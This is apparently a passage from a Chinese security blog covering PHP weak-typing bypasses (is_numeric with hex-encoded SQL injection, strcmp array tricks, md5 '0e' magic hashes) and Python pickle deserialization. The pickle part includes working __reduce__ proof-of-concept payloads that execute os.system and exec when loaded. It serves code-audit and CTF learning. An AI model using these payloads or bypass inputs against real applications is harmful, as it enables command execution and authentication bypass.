<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $i &#x3D; &quot;abc&quot;;</span><br><span class="line">    switch($i)</span><br><span class="line">    &#123;</span><br><span class="line">        case 0: echo &quot;0&quot;; break;</span><br><span class="line">        case 1: echo &quot;1&quot;; break;</span><br><span class="line">        case 2: echo &quot;2&quot;; break;</span><br><span class="line">        case 3: echo &quot;3&quot;; break;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    $i &#x3D; &quot;2abc&quot;;</span><br><span class="line">    switch($i)</span><br><span class="line">    &#123;</span><br><span class="line">        case 0: echo &quot;0&quot;; break;</span><br><span class="line">        case 1: echo &quot;1&quot;; break;</span><br><span class="line">        case 2: echo &quot;2&quot;; break;</span><br><span class="line">        case 3: echo &quot;3&quot;; break;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">0</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $i &#x3D; 0;</span><br><span class="line">    switch($i)</span><br><span class="line">    &#123;</span><br><span class="line">        case &quot;CCC&quot;: echo &quot;CCC&quot;; break;</span><br><span class="line">        case 1: echo &quot;1&quot;; break;</span><br><span class="line">        case 2: echo &quot;2&quot;; break;</span><br><span class="line">        case 3: echo &quot;3&quot;; break;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">CCC</span><br></pre></td></tr></table></figure>

<h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p>​    函数语法：</p>
<p>​        in_array(search,array,type): 如果给定的值 search 存在于数组 array 中则返回 true（类似于==）。如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true（类似于===）。如果没有在数组中找到参数，函数返回 false</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $i &#x3D; &quot;1 or 1 &#x3D; 1&quot;;</span><br><span class="line">    var_dump(in_array($i, array(1,2,3,4,5)));</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    var_dump(in_array($i, array(1,2,3,4,5), true));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">bool(true)</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure>

<h3 id="array-search"><a href="#array-search" class="headerlink" title="array_search()"></a>array_search()</h3><p>​    函数语法：</p>
<p>​        mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] )：$needle，$haystack必需，$strict可选。函数判断$haystack中的值是存在$needle，存在则返回该值的键值。第三个参数默认为false，如果设置为true则会进行严格过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump(array_search(&quot;1admin&quot;, array(1,2))); &#x2F;&#x2F; true int(0)</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(array_search(&quot;1admin&quot;, array(1,2), true)); &#x2F;&#x2F; false</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">int(0)</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure>

<h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h3><p>​    函数语法：</p>
<p>​        (PHP 4, PHP 5, PHP 7)is_numeric ( mixed $var ) : bool，is_numeric – 检测变量是否为数字或数字字符串，如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE</p>
<ul>
<li>is_numeric()函数是判断变量是否是数字或者数字字符串，不仅检查10进制，16进制也可以</li>
<li>is_numeric()对于空字符%00,不论%00放在数字前后，都会返回false,对于%20,只有放在数字后才会返回false</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump(is_numeric(123445)); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(is_numeric(&quot;123445&quot;)); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(is_numeric(0x123445)); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(is_numeric(&quot;0x123445&quot;)); &#x2F;&#x2F; true</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(is_numeric(&quot;123ad&quot;)); &#x2F;&#x2F; false</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump(is_numeric(&quot;asd123&quot;)); &#x2F;&#x2F; false</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(false)</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $name &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">    &#x2F;&#x2F; $con &#x3D; mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">    &#x2F;&#x2F; if (!$con)</span><br><span class="line">    &#x2F;&#x2F; &#123;die(&#39;Could not connect: &#39; . mysql_error());&#125;</span><br><span class="line">    &#x2F;&#x2F; mysql_select_db(&quot;tests&quot;, $con);</span><br><span class="line">    $name &#x3D; 0x312720756e696f6e2073656c65637420312c322c33; &#x2F;&#x2F; 1&#39; union select 1,2,3</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    print($sql);</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    if (is_numeric($name)) &#123;</span><br><span class="line">        $sql&#x3D;&quot;insert into users values (3,&quot; . $name . &quot;,&#39;test&#39;)&quot;;</span><br><span class="line">        &#x2F;&#x2F;mysql_query(&quot;insert into users values (3,&quot; . $name . &quot;,&#39;test&#39;)&quot;);</span><br><span class="line">        echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">        print($sql);</span><br><span class="line">        &#x2F;&#x2F; $sql&#x3D;&quot;insert into users values (3,&quot; . 0x312720756e696f6e2073656c65637420312c322c33 . &quot;,&#39;test&#39;)&quot;;</span><br><span class="line">        # var_dump($sql);</span><br><span class="line">        echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">        &#x2F;&#x2F;var_dump(mysql_query(&quot;insert into users values (3,&quot; . $name . &quot;,&#39;test&#39;)&quot;));</span><br><span class="line">        &#x2F;&#x2F; 数据库可以 16进制传入</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">Notice: Undefined index: name in C:\phpStudy\WWW\test\11.php on line 2</span><br><span class="line"></span><br><span class="line">Notice: Undefined variable: sql in C:\phpStudy\WWW\test\11.php on line 9</span><br><span class="line"></span><br><span class="line">insert into users values (3,7.1836954722831E+49,&#39;test&#39;)</span><br></pre></td></tr></table></figure>

<p><img data-src="./php%E5%BC%B1%E7%B1%BB%E5%9E%8B/1.png" alt></p>
<p>绕过is_numeric检查</p>
<h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h3><p>​    函数语法：strcmp(string1，string2):比较括号内的两个字符串string1和string2</p>
<ul>
<li>当他们两个相等时，返回0；</li>
<li>string1的大于string2时，返回&gt;0;</li>
<li>string1的小于string2时，返回&lt;0</li>
<li>在PHP版本为5.3.3至5.5中（不包含5.5），当strcmp()括号内是一个数组与字符串比较时，也会返回0</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $flag &#x3D; &quot;flag&quot;;</span><br><span class="line">    if (isset($_GET[&#39;a&#39;])) &#123;  </span><br><span class="line">        var_dump(strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0);</span><br><span class="line">        if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 </span><br><span class="line">        &#x2F;&#x2F;比较两个字符串（区分大小写） </span><br><span class="line">            die(&#39;Flag: &#39;.$flag);  </span><br><span class="line">        else  </span><br><span class="line">            print &#39;No&#39;;  </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="./php%E5%BC%B1%E7%B1%BB%E5%9E%8B/2.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a &#x3D; &quot;2398ruuu31fj81k2rio8hg9302i9e1i2098t95yh&quot;;</span><br><span class="line">    $b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line">    if (!strcmp($a, $b)) &#123;</span><br><span class="line">        echo &quot;Bypass by strcmp()!&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;No...&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="./php%E5%BC%B1%E7%B1%BB%E5%9E%8B/3.png" alt></p>
<h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><p>​    函数语法：intval(var)函数用于获取变量的整数值。在转换时，函数会从字符串起始处进行转换直到遇到一个非数字的字符，即使出现<strong>无法转换的字符串也不会报错而是返回0</strong></p>
<ul>
<li>在科学计数法字符串转换为数字时，如果 E 后面的数小于某个值会弄成 double 类型，再强制转换为 int 类型时可能会有奇妙的结果，测试发现某变量为 1e-1000 时已经可以触发这个漏洞绕过两个检查，使得某变量既大于 0 又不大于 0</li>
<li>审计注意溢出，进制转换，传入复合类型等情况</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    var_dump((int)(&#39;1e-1000&#39;)&gt;0); &#x2F;&#x2F; true</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    var_dump(&#39;1e-1000&#39;&gt;0); &#x2F;&#x2F; false</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    var_dump((int)(&#39;1e-10000&#39;)&gt;0); &#x2F;&#x2F; true</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    var_dump(&#39;1e-10000&#39;&gt;0); &#x2F;&#x2F; false</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    var_dump((int)(&#39;1e-100&#39;)&gt;0); &#x2F;&#x2F; true</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    var_dump(&#39;1e-100&#39;&gt;0); &#x2F;&#x2F; true</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    var_dump((int)(&#39;1e-10&#39;)&gt;0); &#x2F;&#x2F; true</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">    var_dump(&#39;1e-10&#39;&gt;0); &#x2F;&#x2F; true</span><br><span class="line">    echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">bool(true)</span><br><span class="line">bool(false)</span><br><span class="line">bool(true)</span><br><span class="line">bool(false)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

<h3 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h3><p>​    函数语法：变量未定义或者为 null 时，isset 函数返回的为 false ,其他都为 true</p>
<h3 id="empty"><a href="#empty" class="headerlink" title="empty()"></a>empty()</h3><p>​    函数语法：变量为：0，”0”, null, ‘’, false,array() 时，使用 empty 函数，返回的都为 true</p>
<p>以下的变量会被认为是空的：</p>
<ul>
<li>“” (空字符串)</li>
<li>0(作为整数的0)</li>
<li>0.0 (作为浮点数的0)</li>
<li>“0” (作为字符串的0)</li>
<li><code>NULL</code></li>
<li><code>FALSE</code></li>
<li>array() (一个空数组)</li>
<li>$var; (一个声明了，但是没有值的变量)</li>
</ul>
<h3 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h3><p>​    函数声明: string md5 ( string $str [, bool $raw_output = false ] )</p>
<ul>
<li>md5()需要是一个string类型的参数。但是当你传递一个array时，md5()不会报错，只是会无法正确地求出array的md5值，返回null，这样就会导致任意2个array的md5值都会相等。</li>
<li>部分字符串由于使用 md5 加密后会变成 0e 开头的字符串，然后使用 == 判断时就容易绕过</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    &#x2F;&#x2F; md5 为 0e 开头的字符串</span><br><span class="line">    &#x2F;&#x2F; s878926199a</span><br><span class="line">    &#x2F;&#x2F; 0e545993274517709034328855841020</span><br><span class="line">    &#x2F;&#x2F; s155964671a</span><br><span class="line">    &#x2F;&#x2F; 0e342768416822451524974117254469</span><br><span class="line">    $md51&#x3D;md5(&#39;QNKCDZO&#39;);</span><br><span class="line">    $a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">    $md52&#x3D;md5($a);</span><br><span class="line">    </span><br><span class="line">    if(isset($a))</span><br><span class="line">    &#123;</span><br><span class="line">        if($a!&#x3D;&#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52)</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;nctf&#123;************&#125;&quot;;&#125;</span><br><span class="line">        else&#123;</span><br><span class="line">                echo &quot;false!!!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo&quot;please input a&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="./php%E5%BC%B1%E7%B1%BB%E5%9E%8B/4.png" alt></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/types.comparisons.php</a></p>
<p><img data-src="./php%E5%BC%B1%E7%B1%BB%E5%9E%8B/5.png" alt></p>
<p><img data-src="./php%E5%BC%B1%E7%B1%BB%E5%9E%8B/6.png" alt></p>
<p><img data-src="./php%E5%BC%B1%E7%B1%BB%E5%9E%8B/7.png" alt></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>弱类型</tag>
      </tags>
  </entry>
  <entry>
    <title>python反序列化(pickle)浅析</title>
    <url>/2020/11/28/blog_formal/security/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pickle)%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h1 id="python反序列化-pickle-浅析"><a href="#python反序列化-pickle-浅析" class="headerlink" title="python反序列化(pickle)浅析"></a>python反序列化(pickle)浅析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    开发任务中，很多时候需要对代码中的一些内容存储起来，或者通过网络传输给另一个进程</p>
<p>​    比如，将列表、字典、对象等持久化到磁盘中，用的时候在反持久化，这个就是序列化与反序列化</p>
<a id="more"></a>

<h2 id="pickle基础"><a href="#pickle基础" class="headerlink" title="pickle基础"></a>pickle基础</h2><ul>
<li>和<code>php</code>类似，<code>python</code>也具有反序列漏洞问题，大体的话一个是<code>pickle</code>导致，另一个是<code>pyyaml</code></li>
<li><code>pickle</code>是已二进制的方式存储的，相对于<code>json</code>，可读性大大降低</li>
<li>功能十分强大，不只能表示基础类型，自定义的类型同样可以表示</li>
<li>可以理解<code>pickle</code>为一门独立的语言，有自己的栈等操作，编写<code>opcode</code>即可进行执行<code>python</code>代码，变量覆盖等操作</li>
</ul>
<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>​    仅仅是一些基本操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, &#123;<span class="string">"a"</span>: <span class="string">"b"</span>&#125;]</span><br><span class="line">print(pickle.dumps(test_list))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="string">b'\x80\x04\x95\x16\x00\x00\x00\x00\x00\x00\x00]\x94(K\x01K\x02K\x03&#125;\x94\x8c\x01a\x94\x8c\x01b\x94se.'</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_str = <span class="string">b'\x80\x04\x95\x16\x00\x00\x00\x00\x00\x00\x00]\x94(K\x01K\x02K\x03&#125;\x94\x8c\x01a\x94\x8c\x01b\x94se.'</span></span><br><span class="line">test_list = pickle.loads(test_str)</span><br><span class="line">print(test_list)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, &#123;<span class="string">'a'</span>: <span class="string">'b'</span>&#125;]</span><br></pre></td></tr></table></figure>

<h3 id="opcode-amp-amp-pickletools"><a href="#opcode-amp-amp-pickletools" class="headerlink" title="opcode&amp;&amp;pickletools"></a>opcode&amp;&amp;pickletools</h3><ul>
<li>opcode可以理解成一门新的语法</li>
<li>py3 py2 生成的opcode 不同</li>
<li>pickle 一共有6种版本，并且向下兼容</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">a = &#123;<span class="string">'1'</span>: <span class="number">1</span>, <span class="string">'2'</span>: <span class="number">2</span>&#125;</span><br><span class="line">print(<span class="string">'a = &#123;0&#125;'</span>.format(a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    print(<span class="string">'version = &#123;0&#125; opcode = &#123;1&#125;'</span>.format(i, pickle.dumps(a, protocol=i)))</span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">version = <span class="number">0</span> opcode = <span class="string">b'(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.'</span></span><br><span class="line">version = <span class="number">1</span> opcode = <span class="string">b'&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'</span></span><br><span class="line">version = <span class="number">2</span> opcode = <span class="string">b'\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'</span></span><br><span class="line">version = <span class="number">3</span> opcode = <span class="string">b'\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'</span></span><br><span class="line">version = <span class="number">4</span> opcode = <span class="string">b'\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.'</span></span><br><span class="line">version = <span class="number">5</span> opcode = <span class="string">b'\x80\x05\x95\x11\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.'</span></span><br></pre></td></tr></table></figure>

<ul>
<li>pickletools 工具可以将 opcode 转换为相对可读性较好的表达</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line">pickletools.dis(<span class="string">b'cnt\nsystem\np0\n(Vcalc.exe\np1\ntp2\nRp3\n.'</span>)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">'nt system'</span></span><br><span class="line">   <span class="number">11</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">14</span>: (    MARK</span><br><span class="line">   <span class="number">15</span>: V        UNICODE    <span class="string">'calc.exe'</span></span><br><span class="line">   <span class="number">25</span>: p        PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">28</span>: t        TUPLE      (MARK at <span class="number">14</span>)</span><br><span class="line">   <span class="number">29</span>: p    PUT        <span class="number">2</span></span><br><span class="line">   <span class="number">32</span>: R    REDUCE</span><br><span class="line">   <span class="number">33</span>: p    PUT        <span class="number">3</span></span><br><span class="line">   <span class="number">36</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="poc-easy-demo"><a href="#poc-easy-demo" class="headerlink" title="poc easy demo"></a>poc easy demo</h3><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenPoc</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        cmd_str = <span class="string">"calc.exe"</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (cmd_str,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode_str = pickle.dumps(GenPoc())</span><br><span class="line">print(opcode_str)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="string">b'\x80\x04\x95 \x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x08calc.exe\x94\x85\x94R\x94.'</span></span><br></pre></td></tr></table></figure>

<p>执行下面代码可以触发漏洞</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">opcode_str = <span class="string">b'\x80\x04\x95 \x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x08calc.exe\x94\x85\x94R\x94.'</span></span><br><span class="line">pickle.loads(opcode_str)</span><br><span class="line">pickletools.dis(opcode_str)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">4</span></span><br><span class="line">    <span class="number">2</span>: \x95 FRAME      <span class="number">32</span></span><br><span class="line">   <span class="number">11</span>: \x8c SHORT_BINUNICODE <span class="string">'nt'</span></span><br><span class="line">   <span class="number">15</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">0</span>)</span><br><span class="line">   <span class="number">16</span>: \x8c SHORT_BINUNICODE <span class="string">'system'</span></span><br><span class="line">   <span class="number">24</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">1</span>)</span><br><span class="line">   <span class="number">25</span>: \x93 STACK_GLOBAL</span><br><span class="line">   <span class="number">26</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">2</span>)</span><br><span class="line">   <span class="number">27</span>: \x8c SHORT_BINUNICODE <span class="string">'calc.exe'</span></span><br><span class="line">   <span class="number">37</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">3</span>)</span><br><span class="line">   <span class="number">38</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">39</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">4</span>)</span><br><span class="line">   <span class="number">40</span>: R    REDUCE</span><br><span class="line">   <span class="number">41</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">5</span>)</span><br><span class="line">   <span class="number">42</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(pickle)%E6%B5%85%E6%9E%90/1.png" alt></p>
<h4 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenPoc2</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        exec_str = <span class="string">"global key; key = 123"</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">exec</span>, (exec_str,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode_str = pickle.dumps(GenPoc2())</span><br><span class="line">print(opcode_str)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="string">b'\x80\x04\x951\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04exec\x94\x93\x94\x8c\x15global key; key = 123\x94\x85\x94R\x94.'</span></span><br></pre></td></tr></table></figure>

<p>执行下面代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">key = <span class="number">456</span></span><br><span class="line">print(<span class="string">"key = &#123;0&#125;"</span>.format(key))</span><br><span class="line">opcode_str = <span class="string">b'\x80\x04\x951\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04exec\x94\x93\x94\x8c\x15global key; key = 123\x94\x85\x94R\x94.'</span></span><br><span class="line">pickletools.dis(opcode_str)</span><br><span class="line">pickle.loads(opcode_str)</span><br><span class="line">print(<span class="string">"key = &#123;0&#125;"</span>.format(key))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">key = <span class="number">456</span></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">4</span></span><br><span class="line">    <span class="number">2</span>: \x95 FRAME      <span class="number">49</span></span><br><span class="line">   <span class="number">11</span>: \x8c SHORT_BINUNICODE <span class="string">'builtins'</span></span><br><span class="line">   <span class="number">21</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">0</span>)</span><br><span class="line">   <span class="number">22</span>: \x8c SHORT_BINUNICODE <span class="string">'exec'</span></span><br><span class="line">   <span class="number">28</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">1</span>)</span><br><span class="line">   <span class="number">29</span>: \x93 STACK_GLOBAL</span><br><span class="line">   <span class="number">30</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">2</span>)</span><br><span class="line">   <span class="number">31</span>: \x8c SHORT_BINUNICODE <span class="string">'global key; key = 123'</span></span><br><span class="line">   <span class="number">54</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">3</span>)</span><br><span class="line">   <span class="number">55</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">56</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">4</span>)</span><br><span class="line">   <span class="number">57</span>: R    REDUCE</span><br><span class="line">   <span class="number">58</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">5</span>)</span><br><span class="line">   <span class="number">59</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">4</span></span><br><span class="line">key = <span class="number">123</span></span><br></pre></td></tr></table></figure>

